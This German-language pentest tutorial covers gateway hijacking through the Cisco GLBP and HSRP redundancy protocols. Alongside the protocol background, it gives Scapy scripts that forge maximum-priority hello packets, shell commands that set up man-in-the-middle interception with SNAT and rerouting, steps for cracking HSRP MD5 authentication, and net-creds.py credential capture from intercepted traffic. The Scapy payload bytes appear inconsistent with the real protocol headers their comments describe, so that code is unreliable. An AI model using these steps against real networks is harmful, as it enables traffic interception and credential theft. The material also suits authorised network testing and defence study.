# GLBP & HSRP Attacks

{{#include ../../banners/hacktricks-training.md}}


## FHRP Hijacking Overview

### Einblicke in FHRP

FHRP wurde entwickelt, um die Netzwerkrobustheit zu erhöhen, indem mehrere Router zu einer einzigen virtuellen Einheit zusammengefasst werden, wodurch Lastverteilung und Fehlertoleranz verbessert werden. Cisco Systems stellte in diesem Bereich etablierte Protokolle wie GLBP und HSRP vor.

### Einblicke in das GLBP-Protokoll

GLBP, von Cisco entwickelt, arbeitet auf dem TCP/IP-Stack und verwendet UDP auf Port 3222 zur Kommunikation. Router in einer GLBP-Gruppe tauschen alle 3 Sekunden „hello“-Pakete aus. Sendet ein Router diese Pakete nicht innerhalb von 10 Sekunden, gilt er als offline. Diese Timer sind jedoch nicht fest und können angepasst werden.

GLBP für IPv6 verwendet Multicast **FF02::66** über UDP/3222, und das virtuelle MAC-Format lautet `0007.b4xx.xxyy` (AVF-ID befindet sich im letzten Byte). Timing und Angriffsfläche bleiben wie bei IPv4 gleich, sodass hijack-Techniken in Dual-Stack-Netzwerken weiterhin funktionieren.

### GLBP-Betrieb und Lastverteilung

GLBP zeichnet sich dadurch aus, Last über Router zu verteilen, indem eine einzige virtuelle IP mit mehreren virtuellen MAC-Adressen kombiniert wird. In einer GLBP-Gruppe ist jeder Router an der Paketweiterleitung beteiligt. Im Gegensatz zu HSRP/VRRP bietet GLBP echte Lastverteilung durch mehrere Mechanismen:

- **Host-Dependent Load Balancing:** Hält die AVF-MAC-Adressenzuordnung für einen Host konsistent, wichtig für stabile NAT-Konfigurationen.
- **Round-Robin Load Balancing:** Der Standardmodus, der die Zuweisung von AVF-MAC-Adressen zyklisch zwischen anfragenden Hosts wechselt.
- **Weighted Round-Robin Load Balancing:** Verteilt die Last basierend auf vordefinierten "Weight"-Metriken.

### Wichtige Komponenten und Terminologie in GLBP

- **AVG (Active Virtual Gateway):** Der primäre Router, zuständig für die Zuweisung von MAC-Adressen an Peer-Router.
- **AVF (Active Virtual Forwarder):** Ein Router, der für die Weiterleitung des Netzwerkverkehrs zuständig ist.
- **GLBP Priority:** Eine Metrik, die das AVG bestimmt; Standardwert ist 100, Wertebereich 1–255.
- **GLBP Weight:** Spiegelt die aktuelle Last eines Routers wider; anpassbar manuell oder über Object Tracking.
- **GLBP Virtual IP Address:** Dient als Standardgateway des Netzwerks für alle verbundenen Geräte.

Für die Kommunikation verwendet GLBP die reservierte Multicast-Adresse 224.0.0.102 und UDP-Port 3222. Router senden alle 3 Sekunden „hello“-Pakete; wird ein Paket über einen Zeitraum von 10 Sekunden verpasst, gelten sie als nicht betriebsbereit.

### GLBP Attack Mechanism

Ein Angreifer kann durch das Senden eines GLBP-Pakets mit dem höchsten Priority-Wert (255) zum primären Router werden. Dies kann zu DoS- oder MITM-Angriffen führen und ermöglicht das Abfangen oder Umleiten von Traffic.

**Praktischer GLBP hijack mit Scapy (kurzes PoC)**
```python
from scapy.all import *

vip = "10.10.100.254"          # learned from sniffing
pkt = IP(dst="224.0.0.102")/UDP(dport=3222,sport=3222)/Raw(
b"\x01\x00\xff\x64"      # Version=1, Opcode=Hello, Priority=255, Weight=100
)
send(pkt, iface="eth0", loop=1, inter=1)
```
Erstelle die Payload-Bytes, um den GLBP-Header (version/opcode/priority/weight/VRID) nachzubilden. Durch wiederholtes Senden des Frames stellst du sicher, dass du die AVG-Wahl gewinnst, wenn keine Authentifizierung vorhanden ist.

### Durchführung eines GLBP-Angriffs mit Loki

[Loki](https://github.com/raizo62/loki_on_kali) kann einen GLBP-Angriff durchführen, indem ein Paket mit priority und weight auf 255 injiziert wird. Vor dem Angriff sollten Informationen gesammelt werden, wie die virtuelle IP-Adresse, ob Authentifizierung vorhanden ist, und die Router-Prioritätswerte, z. B. mit Wireshark.

Attack Steps:

1. Wechsle in den promiscuous mode und aktiviere IP forwarding.
2. Identifiziere den Zielrouter und ermittle seine IP.
3. Erzeuge eine Gratuitous ARP.
4. Injiziere ein bösartiges GLBP-Paket und gib dich als AVG aus.
5. Weise der Netzwerkschnittstelle des Angreifers eine sekundäre IP-Adresse zu, die der GLBP-virtuellen IP entspricht.
6. Implementiere SNAT, um vollständige Sichtbarkeit des Traffics zu erhalten.
7. Passe das Routing an, um weiterhin Internetzugang über den ursprünglichen AVG-Router sicherzustellen.

Durch Befolgung dieser Schritte positioniert sich der Angreifer als "man in the middle" und kann Netzwerkverkehr abfangen und analysieren, einschließlich unverschlüsselter oder sensibler Daten.

Zur Demonstration sind hier die erforderlichen Befehls-Snippets:
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
Die Überwachung und Abfangung von Traffic kann mit net-creds.py oder ähnlichen Tools durchgeführt werden, um Daten zu erfassen und zu analysieren, die durch das kompromittierte Netzwerk fließen.

### Passive Erklärung von HSRP Hijacking mit Befehlsdetails

#### Übersicht über HSRP (Hot Standby Router/Redundancy Protocol)

HSRP ist ein proprietäres Cisco-Protokoll, das für Redundanz von Netzwerk-Gateways entwickelt wurde. Es ermöglicht die Konfiguration mehrerer physischer Router als eine einzige logische Einheit mit einer gemeinsamen IP-Adresse. Diese logische Einheit wird von einem primären Router verwaltet, der für die Weiterleitung des Traffics verantwortlich ist. Im Gegensatz zu GLBP, das Metriken wie priority und weight für load balancing verwendet, setzt HSRP auf einen einzelnen aktiven Router zur Verkehrssteuerung.

HSRPv1 verwendet Multicast **224.0.0.2** und virtuelle MAC `0000.0c07.acXX`; HSRPv2 und HSRPv2 für IPv6 verwenden **224.0.0.102 / FF02::66** und virtuelle MAC `0000.0c9f.fXXX`. Der UDP-Zielport ist **1985** für IPv4 und **2029** für IPv6.

#### Rollen und Terminologie in HSRP

- **HSRP Active Router**: Das Gerät, das als Gateway fungiert und den Datenverkehr steuert.
- **HSRP Standby Router**: Ein Backup-Router, der bereit ist zu übernehmen, falls der Active Router ausfällt.
- **HSRP Group**: Eine Gruppe von Routern, die zusammenarbeiten, um einen einzigen ausfallsicheren virtuellen Router zu bilden.
- **HSRP MAC Address**: Eine virtuelle MAC-Adresse, die dem logischen Router in der HSRP-Konfiguration zugewiesen ist.
- **HSRP Virtual IP Address**: Die virtuelle IP-Adresse der HSRP-Gruppe, die als Standardgateway für angeschlossene Geräte dient.

#### HSRP-Versionen

HSRP existiert in zwei Versionen, HSRPv1 und HSRPv2, die sich hauptsächlich in Gruppenanzahl, Multicast-IP-Nutzung und Struktur der virtuellen MAC-Adresse unterscheiden. Das Protokoll verwendet bestimmte Multicast-IP-Adressen zum Austausch von Service-Informationen; Hello-Pakete werden alle 3 Sekunden gesendet. Ein Router gilt als inaktiv, wenn innerhalb eines 10-Sekunden-Intervalls kein Paket empfangen wird.

#### HSRP-Angriffsmechanismus

HSRP-Angriffe beinhalten das erzwungene Übernehmen der Rolle des Active Router durch Injizieren eines maximalen priority-Werts. Dies kann zu einem Man-In-The-Middle (MITM)-Angriff führen. Wesentliche Vorbereitungen vor dem Angriff umfassen das Sammeln von Informationen über die HSRP-Konfiguration, was mit Wireshark zur Traffic-Analyse durchgeführt werden kann.

**Schnelle HSRP takeover mit Scapy**
```python
from scapy.all import *

vip = "10.10.100.1"
pkt = IP(dst="224.0.0.102")/UDP(sport=1985,dport=1985)/Raw(
b"\x00\x02\xff\x03\x00\x00\x00\x01"  # Hello, priority 255, group 1
)
send(pkt, iface="eth0", inter=1, loop=1)
```
Wenn keine Authentifizierung **konfiguriert** ist, zwingt das kontinuierliche Senden von hellos mit höherer Priorität die Peers in die *Speak*/*Listen*-Zustände und ermöglicht es Ihnen, *Active* zu werden, wodurch Traffic über Ihren Host umgeleitet wird.

**HSRP authentication corner cases**

- Legacy plain-text auth ist trivial spoofbar.
- MD5 authentication deckt nur die HSRP-Nutzlast ab; manipulierte Pakete können dennoch Rate-Limiting/DoS gegen Control-Planes verursachen. NX-OS-Releases erlaubten zuvor DoS gegen authentifizierte Gruppen (siehe Cisco advisory CSCup11309).
- Auf vielen ISP / VPS Shared-VLANs sind HSRPv1-Multicasts für Tenants sichtbar; ohne Auth können Sie beitreten und Traffic preempten.

#### Schritte zum Umgehen der HSRP-Authentifizierung

1. Speichern Sie den Netzwerkverkehr mit HSRP-Daten als .pcap-Datei.
```shell
tcpdump -w hsrp_traffic.pcap
```
2. Extrahieren Sie MD5-Hashes aus der .pcap-Datei mit hsrp2john.py.
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. Cracken Sie die MD5-Hashes mit John the Ripper.
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Durchführung der HSRP-Injektion mit Loki**

1. Starten Sie Loki, um HSRP-Advertisements zu identifizieren.
2. Setzen Sie die Netzwerkschnittstelle in den Promiscuous-Modus und aktivieren Sie IP-Forwarding.
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. Verwenden Sie Loki, um den spezifischen Router anzugreifen, geben Sie das geknackte HSRP-Passwort ein und führen Sie die notwendigen Konfigurationen durch, um den Active Router zu imitieren.
4. Nachdem Sie die Rolle des Active Router erlangt haben, konfigurieren Sie Ihre Netzwerkschnittstelle und IPTables, um den legitimen Traffic abzufangen.
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. Ändern Sie die Routingtabelle, damit der Traffic über den ehemaligen Active Router geleitet wird.
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. Verwenden Sie net-creds.py oder ein ähnliches Tool, um Anmeldeinformationen aus dem abgefangenen Traffic zu erfassen.
```shell
sudo python2 net-creds.py -i eth0
```

Das Ausführen dieser Schritte versetzt den Angreifer in die Lage, Traffic abzufangen und zu manipulieren, ähnlich dem Vorgehen bei GLBP-Hijacking. Das verdeutlicht die Verwundbarkeit von Redundanzprotokollen wie HSRP und die Notwendigkeit robuster Sicherheitsmaßnahmen.

## References

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- [Cisco NX-OS HSRP authentication DoS (CSCup11309)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/Cisco-SA-20140611-CVE-2014-3295)
- [Reddit: HSRP seen on VPS shared VLANs](https://www.reddit.com/r/networking/comments/1h0v1aq/hsrp_seen_on_cloud_vlans_without_auth/)
{{#include ../../banners/hacktricks-training.md}}
